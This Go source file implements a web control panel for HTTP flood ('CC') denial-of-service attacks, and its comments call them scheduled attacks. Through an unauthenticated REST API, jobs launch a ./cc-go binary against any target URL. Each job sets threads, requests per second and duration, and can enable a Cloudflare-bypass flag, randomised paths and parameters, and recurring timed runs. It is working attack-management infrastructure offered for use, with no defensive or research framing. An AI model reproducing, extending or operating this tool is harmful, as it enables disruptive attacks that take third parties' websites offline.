package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/gorilla/mux"
)

// 任务状态
type TaskStatus string

const (
	StatusPending   TaskStatus = "pending"
	StatusRunning   TaskStatus = "running"
	StatusCompleted TaskStatus = "completed"
	StatusFailed    TaskStatus = "failed"
	StatusStopped   TaskStatus = "stopped"
)

// 任务结构
type Task struct {
	ID               string     `json:"id"`
	Name             string     `json:"name"`
	TargetURL        string     `json:"target_url"`
	Mode             string     `json:"mode"`
	Threads          int        `json:"threads"`
	RPS              int        `json:"rps"`
	Duration         int        `json:"duration"`
	Timeout          int        `json:"timeout"`
	CFBypass         bool       `json:"cf_bypass"`
	RandomPath       bool       `json:"random_path"`
	RandomParams     bool       `json:"random_params"`
	Schedule         bool       `json:"schedule"`
	ScheduleInterval int               `json:"schedule_interval"`
	ScheduleDuration int               `json:"schedule_duration"`
	CustomHeaders    map[string]string `json:"custom_headers"`
	Status           TaskStatus        `json:"status"`
	CreatedAt        time.Time  `json:"created_at"`
	StartedAt        *time.Time `json:"started_at,omitempty"`
	CompletedAt      *time.Time `json:"completed_at,omitempty"`
	Process          *exec.Cmd  `json:"-"`
	Logs             []string   `json:"logs"`
	Stats            *TaskStats `json:"stats"`
}

// 任务统计
type TaskStats struct {
	TotalRequests  int64   `json:"total_requests"`
	SuccessfulReqs int64   `json:"successful_requests"`
	FailedReqs     int64   `json:"failed_requests"`
	CurrentRPS     float64 `json:"current_rps"`
	AvgRPS         float64 `json:"avg_rps"`
	Uptime         float64 `json:"uptime"`
}

// 服务器性能统计
type ServerStats struct {
	CPUUsage    float64 `json:"cpu_usage"`
	MemoryUsage float64 `json:"memory_usage"`
	MemoryTotal uint64  `json:"memory_total"`
	MemoryUsed  uint64  `json:"memory_used"`
	Goroutines  int     `json:"goroutines"`
	Uptime      float64 `json:"uptime"`
	NetworkRx   float64 `json:"network_rx"`   // 接收速度 (MB/s)
	NetworkTx   float64 `json:"network_tx"`   // 发送速度 (MB/s)
	CORSErrors  int64   `json:"cors_errors"`  // CORS错误统计
	StartTime   time.Time
}

// 全局变量
var (
	tasks        = make(map[string]*Task)
	tasksMutex   sync.RWMutex
	tasksFile    = "/cc-tasks.json"
	port         = "8080"
	serverStats  = &ServerStats{StartTime: time.Now()}
	lastRxBytes  uint64
	lastTxBytes  uint64
	lastNetTime  time.Time
	schedulers   = make(map[string]*time.Ticker) // 定时任务调度器
	schedulerMutex sync.RWMutex
	corsErrors   int64 // CORS错误统计
)

func main() {
	// 解析命令行参数
	parseArgs()
	
	// 加载任务列表
	loadTasks()
	
	// 启动时关闭所有运行中的任务
	stopAllRunningTasks()
	
	// 创建路由器
	r := mux.NewRouter()
	
	// API路由
	api := r.PathPrefix("/api").Subrouter()
	
	// 任务管理API
	api.HandleFunc("/tasks", getTasks).Methods("GET")
	api.HandleFunc("/tasks", createTask).Methods("POST")
	api.HandleFunc("/tasks/{id}", getTask).Methods("GET")
	api.HandleFunc("/tasks/{id}", updateTask).Methods("PUT")
	api.HandleFunc("/tasks/{id}", deleteTask).Methods("DELETE")
	api.HandleFunc("/tasks/{id}/start", startTask).Methods("POST")
	api.HandleFunc("/tasks/{id}/stop", stopTask).Methods("POST")
	api.HandleFunc("/tasks/{id}/logs", getTaskLogs).Methods("GET")
	api.HandleFunc("/tasks/{id}/stats", getTaskStats).Methods("GET")
	
	// SSE连接
	api.HandleFunc("/events", handleSSE)
	
	// 服务器性能API
	api.HandleFunc("/server-stats", getServerStats).Methods("GET")
	api.HandleFunc("/update-cors-errors", updateCORSErrors).Methods("POST")
	
	// 静态文件服务（放在最后，避免拦截API请求）
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("./frontend/")))
	
	// 启动服务器
	fmt.Println("🚀 API服务器启动中...")
	
	// 启动性能监控
	go updateServerStats()
	
	// 移除服务器启动信息输出
	
	log.Fatal(http.ListenAndServe(":"+port, r))
}

// API处理器函数
func getTasks(w http.ResponseWriter, r *http.Request) {
	tasksMutex.RLock()
	defer tasksMutex.RUnlock()
	
	var taskList []*Task
	for _, task := range tasks {
		taskList = append(taskList, task)
	}
	
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	json.NewEncoder(w).Encode(taskList)
}

func createTask(w http.ResponseWriter, r *http.Request) {
	var task Task
	if err := json.NewDecoder(r.Body).Decode(&task); err != nil {
		http.Error(w, "Invalid JSON: "+err.Error(), http.StatusBadRequest)
		return
	}
	
	// 验证必填字段
	if task.Name == "" {
		http.Error(w, "任务名称不能为空", http.StatusBadRequest)
		return
	}
	if task.TargetURL == "" {
		http.Error(w, "目标URL不能为空", http.StatusBadRequest)
		return
	}
	
	task.ID = generateTaskID()
	task.CreatedAt = time.Now()
	task.Status = StatusPending
	task.Logs = []string{}
	task.Stats = &TaskStats{}
	
	tasksMutex.Lock()
	tasks[task.ID] = &task
	tasksMutex.Unlock()
	
	// 保存任务列表
	if err := saveTasks(); err != nil {
		http.Error(w, "保存任务失败", http.StatusInternalServerError)
		return
	}
	
	// 如果状态是running，立即启动
	if task.Status == StatusRunning {
		if task.Schedule {
			// 启动定时任务
			go startScheduledTask(&task)
		} else {
			// 立即启动任务
			go startTaskProcess(&task)
		}
	}
	
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	json.NewEncoder(w).Encode(task)
}

func getTask(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	taskId := vars["id"]
	
	tasksMutex.RLock()
	task, exists := tasks[taskId]
	tasksMutex.RUnlock()
	
	if !exists {
		http.Error(w, "Task not found", http.StatusNotFound)
		return
	}
	
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	json.NewEncoder(w).Encode(task)
}

func updateTask(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	taskId := vars["id"]
	
	tasksMutex.Lock()
	task, exists := tasks[taskId]
	if !exists {
		tasksMutex.Unlock()
		http.Error(w, "Task not found", http.StatusNotFound)
		return
	}
	
	var updates Task
	if err := json.NewDecoder(r.Body).Decode(&updates); err != nil {
		tasksMutex.Unlock()
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}
	
	// 更新任务字段
	task.Name = updates.Name
	task.TargetURL = updates.TargetURL
	task.Mode = updates.Mode
	task.Threads = updates.Threads
	task.RPS = updates.RPS
	task.Duration = updates.Duration
	task.Timeout = updates.Timeout
	task.CFBypass = updates.CFBypass
	task.RandomPath = updates.RandomPath
	task.RandomParams = updates.RandomParams
	task.Schedule = updates.Schedule
	task.ScheduleInterval = updates.ScheduleInterval
	task.ScheduleDuration = updates.ScheduleDuration
	task.CustomHeaders = updates.CustomHeaders
	
	tasksMutex.Unlock()
	
	// 保存任务列表
	if err := saveTasks(); err != nil {
		// 移除保存失败日志
	}
	
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	json.NewEncoder(w).Encode(task)
}

func deleteTask(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	taskId := vars["id"]
	
	tasksMutex.Lock()
	task, exists := tasks[taskId]
	if !exists {
		tasksMutex.Unlock()
		http.Error(w, "Task not found", http.StatusNotFound)
		return
	}
	
	// 停止任务进程
	if task.Process != nil {
		task.Process.Process.Kill()
	}
	
	// 停止定时调度器
	schedulerMutex.Lock()
	if scheduler, ok := schedulers[taskId]; ok {
		scheduler.Stop()
		delete(schedulers, taskId)
	}
	schedulerMutex.Unlock()
	
	delete(tasks, taskId)
	tasksMutex.Unlock()
	
	// 保存任务列表
	if err := saveTasks(); err != nil {
		// 移除保存失败日志
	}
	
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.WriteHeader(http.StatusOK)
}

func startTask(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	taskId := vars["id"]
	
	// 移除启动任务日志
	
	tasksMutex.Lock()
	task, exists := tasks[taskId]
	if !exists {
		tasksMutex.Unlock()
		// 移除任务不存在日志
		http.Error(w, "Task not found", http.StatusNotFound)
		return
	}
	
	if task.Status == StatusRunning {
		tasksMutex.Unlock()
		// 移除任务已在运行日志
		http.Error(w, "Task is already running", http.StatusBadRequest)
		return
	}
	
	// 验证任务参数
	if task.TargetURL == "" {
		tasksMutex.Unlock()
		// 移除目标URL为空日志
		http.Error(w, "Target URL is required", http.StatusBadRequest)
		return
	}
	
	if task.Threads <= 0 {
		task.Threads = 100
	}
	if task.RPS <= 0 {
		task.RPS = 1000
	}
	if task.Duration <= 0 {
		task.Duration = 600
	}
	if task.Timeout <= 0 {
		task.Timeout = 30
	}
	
	task.Status = StatusRunning
	now := time.Now()
	task.StartedAt = &now
	task.Logs = append(task.Logs, fmt.Sprintf("[%s] 任务启动中...", now.Format("15:04:05")))
	tasksMutex.Unlock()
	
	// 保存任务列表
	if err := saveTasks(); err != nil {
		// 移除保存失败日志
	}
	
	// 移除任务启动成功日志
	
	// 启动任务进程
	if task.Schedule {
		// 启动定时任务
		go startScheduledTask(task)
	} else {
		// 立即启动任务
		go startTaskProcess(task)
	}
	
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	json.NewEncoder(w).Encode(map[string]string{"status": "started"})
}

func stopTask(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	taskId := vars["id"]
	
	tasksMutex.Lock()
	task, exists := tasks[taskId]
	if !exists {
		tasksMutex.Unlock()
		http.Error(w, "Task not found", http.StatusNotFound)
		return
	}
	
	if task.Status != StatusRunning {
		tasksMutex.Unlock()
		http.Error(w, "Task is not running", http.StatusBadRequest)
		return
	}
	
	// 停止任务进程
	if task.Process != nil {
		task.Process.Process.Kill()
		task.Process = nil
	}
	
	// 停止定时调度器
	schedulerMutex.Lock()
	if scheduler, ok := schedulers[taskId]; ok {
		scheduler.Stop()
		delete(schedulers, taskId)
	}
	schedulerMutex.Unlock()
	
	task.Status = StatusStopped
	now := time.Now()
	task.CompletedAt = &now
	
	// 添加停止日志
	task.Logs = append(task.Logs, fmt.Sprintf("[%s] 任务已手动停止", now.Format("15:04:05")))
	tasksMutex.Unlock()
	
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.WriteHeader(http.StatusOK)
}

func getTaskLogs(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	taskId := vars["id"]
	
	tasksMutex.RLock()
	task, exists := tasks[taskId]
	tasksMutex.RUnlock()
	
	if !exists {
		http.Error(w, "Task not found", http.StatusNotFound)
		return
	}
	
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	json.NewEncoder(w).Encode(task.Logs)
}

func getTaskStats(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	taskId := vars["id"]
	
	tasksMutex.RLock()
	task, exists := tasks[taskId]
	tasksMutex.RUnlock()
	
	if !exists {
		http.Error(w, "Task not found", http.StatusNotFound)
		return
	}
	
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	json.NewEncoder(w).Encode(task.Stats)
}

func handleSSE(w http.ResponseWriter, r *http.Request) {
	// 设置SSE响应头
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Cache-Control")

	// 生成连接ID
	connID := fmt.Sprintf("%p", w)
	
	// 注册连接
	sseMutex.Lock()
	sseConnections[connID] = w
	sseMutex.Unlock()
	
	// 连接断开时清理
	defer func() {
		sseMutex.Lock()
		delete(sseConnections, connID)
		sseMutex.Unlock()
	}()

	// 发送初始任务状态
	tasksMutex.RLock()
	for _, task := range tasks {
		data := map[string]interface{}{
			"type": "task_update",
			"task": task,
		}
		jsonData, _ := json.Marshal(data)
		fmt.Fprintf(w, "data: %s\n\n", jsonData)
	}
	tasksMutex.RUnlock()
	
	// 刷新响应
	if flusher, ok := w.(http.Flusher); ok {
		flusher.Flush()
	}

	// 保持连接活跃，定期发送心跳
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-ticker.C:
			// 发送心跳
			fmt.Fprintf(w, "data: {\"type\":\"heartbeat\"}\n\n")
			if flusher, ok := w.(http.Flusher); ok {
				flusher.Flush()
			}
		case <-r.Context().Done():
			// 客户端断开连接
			return
		}
	}
}

// 启动任务进程
func startTaskProcess(task *Task) {
	// 移除构建命令参数日志
	
	// 构建命令 - 按main.go中的参数顺序
	cmd := exec.Command("./cc-go",
		"-url", task.TargetURL,
		"-mode", task.Mode,
		"-threads", strconv.Itoa(task.Threads),
		"-rps", strconv.Itoa(task.RPS),
		"-duration", strconv.Itoa(task.Duration),
		"-timeout", strconv.Itoa(task.Timeout),
		"-cf-bypass", strconv.FormatBool(task.CFBypass),
		"-random-params", strconv.FormatBool(task.RandomParams),
		"-schedule", strconv.FormatBool(task.Schedule),
		"-schedule-interval", strconv.Itoa(task.ScheduleInterval),
		"-schedule-duration", strconv.Itoa(task.ScheduleDuration),
		"-random-path", strconv.FormatBool(task.RandomPath),
	)
	
	// 移除执行命令日志
	
	
	// 设置工作目录
	cmd.Dir = "."
	
	// 设置进程组，便于管理
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	
	// 检查cc-go文件是否存在
	if _, err := os.Stat("./cc-go"); os.IsNotExist(err) {
		task.Status = StatusFailed
		task.Logs = append(task.Logs, fmt.Sprintf("[%s] 错误: cc-go文件不存在", time.Now().Format("15:04:05")))
		return
	}
	
	// 设置输出管道
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		task.Status = StatusFailed
		task.Logs = append(task.Logs, fmt.Sprintf("[%s] 创建输出管道失败: %v", time.Now().Format("15:04:05"), err))
		return
	}
	
	stderr, err := cmd.StderrPipe()
	if err != nil {
		task.Status = StatusFailed
		task.Logs = append(task.Logs, fmt.Sprintf("[%s] 创建错误管道失败: %v", time.Now().Format("15:04:05"), err))
		return
	}
	
	// 启动进程
	task.Process = cmd
	err = cmd.Start()
	if err != nil {
		task.Status = StatusFailed
		task.Logs = append(task.Logs, fmt.Sprintf("[%s] 启动失败: %v", time.Now().Format("15:04:05"), err))
		return
	}
	
	task.Logs = append(task.Logs, fmt.Sprintf("[%s] 进程启动成功，PID: %d", time.Now().Format("15:04:05"), cmd.Process.Pid))
	
	// 启动日志捕获
	go func() {
		scanner := bufio.NewScanner(stdout)
		for scanner.Scan() {
			line := scanner.Text()
			task.Logs = append(task.Logs, fmt.Sprintf("[%s] %s", time.Now().Format("15:04:05"), line))
			
			// 解析统计信息
			if strings.Contains(line, "STATS_JSON:") {
				statsJSON := strings.TrimPrefix(line, "STATS_JSON:")
				var stats TaskStats
				if err := json.Unmarshal([]byte(statsJSON), &stats); err == nil {
					task.Stats = &stats
				}
			}
			
			// 通过SSE发送日志更新
			sendSSEMessage(map[string]interface{}{
				"type":    "task_log",
				"task_id": task.ID,
				"log":     line,
			})
		}
	}()
	
	go func() {
		scanner := bufio.NewScanner(stderr)
		for scanner.Scan() {
			line := scanner.Text()
			task.Logs = append(task.Logs, fmt.Sprintf("[%s] ERROR: %s", time.Now().Format("15:04:05"), line))
			
			// 通过SSE发送错误日志更新
			sendSSEMessage(map[string]interface{}{
				"type":    "task_log",
				"task_id": task.ID,
				"log":     "ERROR: " + line,
			})
		}
	}()
	
	// 异步等待进程完成
	go func() {
		err := cmd.Wait()
		now := time.Now()
		
		// 检查任务是否已被手动停止
		tasksMutex.RLock()
		currentStatus := task.Status
		tasksMutex.RUnlock()
		
		if currentStatus == StatusStopped {
			// 任务已被手动停止，不改变状态
			task.Logs = append(task.Logs, fmt.Sprintf("[%s] 任务已停止", now.Format("15:04:05")))
		} else if err != nil {
			task.Status = StatusFailed
			task.Logs = append(task.Logs, fmt.Sprintf("[%s] 进程异常退出: %v", now.Format("15:04:05"), err))
		} else {
			task.Status = StatusCompleted
			task.Logs = append(task.Logs, fmt.Sprintf("[%s] 任务完成", now.Format("15:04:05")))
		}
		
		task.CompletedAt = &now
		
		// 清理进程引用
		task.Process = nil
	}()
}

// 解析命令行参数
func parseArgs() {
	flag.StringVar(&port, "port", "8080", "服务器端口")
	flag.StringVar(&tasksFile, "tasks-file", "/cc-tasks.json", "任务列表文件路径")
	flag.Parse()
}

// 生成任务ID
func generateTaskID() string {
	return fmt.Sprintf("task_%d_%d", time.Now().Unix(), time.Now().Nanosecond()%1000)
}

// 加载任务列表
func loadTasks() {
	// 检查文件是否存在
	if _, err := os.Stat(tasksFile); os.IsNotExist(err) {
		// 文件不存在，创建空的任务列表
		saveTasks()
		return
	}
	
	// 读取文件
	data, err := ioutil.ReadFile(tasksFile)
	if err != nil {
		return
	}
	
	// 解析JSON
	var taskList []*Task
	if err := json.Unmarshal(data, &taskList); err != nil {
		return
	}
	
	// 加载到内存，并将所有任务状态设为停止
	tasksMutex.Lock()
	modifiedCount := 0
	for _, task := range taskList {
		// 将所有非停止状态的任务改为停止状态
		if task.Status != StatusStopped {
			task.Status = StatusStopped
			task.Process = nil
			task.CompletedAt = nil
			modifiedCount++
		}
		tasks[task.ID] = task
	}
	tasksMutex.Unlock()
	
	// 如果有任务状态被修改，保存文件
	if modifiedCount > 0 {
		saveTasks()
	}
}

// 停止所有运行中的任务
func stopAllRunningTasks() {
	tasksMutex.Lock()
	defer tasksMutex.Unlock()
	
	stoppedCount := 0
	for _, task := range tasks {
		if task.Status == StatusRunning && task.Process != nil {
			// 停止进程
			if err := task.Process.Process.Kill(); err != nil {
				// 移除停止任务失败日志
			} else {
				stoppedCount++
			}
			
			// 更新任务状态
			task.Status = StatusStopped
			task.Process = nil
			task.Logs = append(task.Logs, fmt.Sprintf("[%s] 服务重启，任务已停止", time.Now().Format("15:04:05")))
		}
	}
	
	if stoppedCount > 0 {
		// 保存任务状态
		saveTasks()
	}
}

// 保存任务列表
func saveTasks() error {
	tasksMutex.RLock()
	var taskList []*Task
	for _, task := range tasks {
		taskList = append(taskList, task)
	}
	tasksMutex.RUnlock()
	
	// 转换为JSON
	data, err := json.MarshalIndent(taskList, "", "  ")
	if err != nil {
		return err
	}
	
	// 写入文件
	if err := ioutil.WriteFile(tasksFile, data, 0644); err != nil {
		return err
	}
	
	return nil
}

// 全局SSE连接管理
var sseConnections = make(map[string]http.ResponseWriter)
var sseMutex sync.RWMutex

// 发送SSE消息
func sendSSEMessage(data map[string]interface{}) {
	jsonData, _ := json.Marshal(data)
	message := fmt.Sprintf("data: %s\n\n", jsonData)
	
	sseMutex.RLock()
	defer sseMutex.RUnlock()
	
	for _, conn := range sseConnections {
		if flusher, ok := conn.(http.Flusher); ok {
			fmt.Fprintf(conn, message)
			flusher.Flush()
		}
	}
}

// 获取服务器性能统计
func getServerStats(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	json.NewEncoder(w).Encode(serverStats)
}

// 更新CORS错误统计
func updateCORSErrors(w http.ResponseWriter, r *http.Request) {
	var request struct {
		CORSErrors int64 `json:"cors_errors"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&request); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}
	
	atomic.StoreInt64(&corsErrors, request.CORSErrors)
	
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	json.NewEncoder(w).Encode(map[string]string{"status": "success"})
}

// 更新服务器性能统计
func updateServerStats() {
	ticker := time.NewTicker(1 * time.Second) // 改为每秒更新
	defer ticker.Stop()
	
	// 初始化网络统计
	lastNetTime = time.Now()
	
	for range ticker.C {
		// 更新运行时间
		serverStats.Uptime = time.Since(serverStats.StartTime).Seconds()
		
		// 更新Goroutine数量
		serverStats.Goroutines = runtime.NumGoroutine()
		
		// 更新内存使用情况
		var m runtime.MemStats
		runtime.ReadMemStats(&m)
		serverStats.MemoryUsed = m.Alloc
		serverStats.MemoryTotal = m.Sys
		serverStats.MemoryUsage = float64(m.Alloc) / float64(m.Sys) * 100
		
		// 更准确的CPU使用率计算
		serverStats.CPUUsage = calculateCPUUsage()
		
		// 更新CORS错误统计
		serverStats.CORSErrors = atomic.LoadInt64(&corsErrors)
		
		// 更新网络速度
		updateNetworkStats()
	}
}

// 计算CPU使用率
func calculateCPUUsage() float64 {
	// 使用更准确的CPU使用率计算
	// 基于进程CPU时间统计
	var rusage syscall.Rusage
	err := syscall.Getrusage(syscall.RUSAGE_SELF, &rusage)
	if err != nil {
		// 如果获取失败，返回基于goroutine数量的估算值
		return float64(runtime.NumGoroutine()) * 0.5
	}
	
	// 计算CPU使用率（用户时间 + 系统时间）
	userTime := float64(rusage.Utime.Sec) + float64(rusage.Utime.Usec)/1000000.0
	sysTime := float64(rusage.Stime.Sec) + float64(rusage.Stime.Usec)/1000000.0
	totalTime := userTime + sysTime
	
	// 基于总CPU时间估算使用率，限制在合理范围内
	cpuUsage := totalTime * 100.0 // 调整系数以获得更合理的显示
	if cpuUsage > 100 {
		cpuUsage = 100
	}
	if cpuUsage < 0 {
		cpuUsage = 0
	}
	
	return cpuUsage
}

// 更新网络统计
func updateNetworkStats() {
	// 读取 /proc/net/dev 文件获取网络统计信息
	data, err := ioutil.ReadFile("/proc/net/dev")
	if err != nil {
		// 如果无法读取网络统计，使用模拟数据
		serverStats.NetworkRx = float64(runtime.NumGoroutine()) * 0.1
		serverStats.NetworkTx = float64(runtime.NumGoroutine()) * 0.05
		return
	}
	
	lines := strings.Split(string(data), "\n")
	var totalRx, totalTx uint64
	
	for _, line := range lines {
		if strings.Contains(line, ":") && !strings.Contains(line, "lo:") {
			parts := strings.Fields(line)
			if len(parts) >= 10 {
				// 解析接收和发送字节数
				if rx, err := strconv.ParseUint(parts[1], 10, 64); err == nil {
					totalRx += rx
				}
				if tx, err := strconv.ParseUint(parts[9], 10, 64); err == nil {
					totalTx += tx
				}
			}
		}
	}
	
	now := time.Now()
	if !lastNetTime.IsZero() {
		// 计算速度 (MB/s)
		timeDiff := now.Sub(lastNetTime).Seconds()
		if timeDiff > 0 {
			rxDiff := float64(totalRx - lastRxBytes)
			txDiff := float64(totalTx - lastTxBytes)
			
			serverStats.NetworkRx = (rxDiff / (1024 * 1024)) / timeDiff
			serverStats.NetworkTx = (txDiff / (1024 * 1024)) / timeDiff
		}
	}
	
	lastRxBytes = totalRx
	lastTxBytes = totalTx
	lastNetTime = now
}

// 启动定时任务
func startScheduledTask(task *Task) {
	if task.ScheduleInterval <= 0 {
		task.Status = StatusFailed
		task.Logs = append(task.Logs, fmt.Sprintf("[%s] 定时间隔必须大于0", time.Now().Format("15:04:05")))
		return
	}
	
	// 创建定时器
	ticker := time.NewTicker(time.Duration(task.ScheduleInterval) * time.Minute)
	
	// 保存调度器
	schedulerMutex.Lock()
	schedulers[task.ID] = ticker
	schedulerMutex.Unlock()
	
	// 添加启动日志
	task.Logs = append(task.Logs, fmt.Sprintf("[%s] 启动定时任务: 每%d分钟执行一次，每次%d分钟", 
		time.Now().Format("15:04:05"), task.ScheduleInterval, task.ScheduleDuration))
	
	// 立即执行一次
	executeScheduledAttack(task)
	
	// 定时执行
	for {
		select {
		case <-ticker.C:
			// 检查任务是否还在运行
			tasksMutex.RLock()
			currentTask, exists := tasks[task.ID]
			tasksMutex.RUnlock()
			
			if !exists || currentTask.Status != StatusRunning {
				// 任务已停止，清理调度器
				schedulerMutex.Lock()
				if scheduler, ok := schedulers[task.ID]; ok {
					scheduler.Stop()
					delete(schedulers, task.ID)
				}
				schedulerMutex.Unlock()
				return
			}
			
			executeScheduledAttack(task)
		}
	}
}

// 执行定时攻击
func executeScheduledAttack(task *Task) {
	// 创建临时任务配置，使用定时持续时间
	tempTask := *task
	tempTask.Duration = task.ScheduleDuration * 60 // 转换为秒
	
	// 添加执行日志
	task.Logs = append(task.Logs, fmt.Sprintf("[%s] 开始执行定时攻击，持续%d分钟", 
		time.Now().Format("15:04:05"), task.ScheduleDuration))
	
	// 启动攻击进程
	startTaskProcess(&tempTask)
	
	// 等待攻击完成
	time.Sleep(time.Duration(task.ScheduleDuration) * time.Minute)
	
	// 添加完成日志
	task.Logs = append(task.Logs, fmt.Sprintf("[%s] 定时攻击执行完成", 
		time.Now().Format("15:04:05")))
}
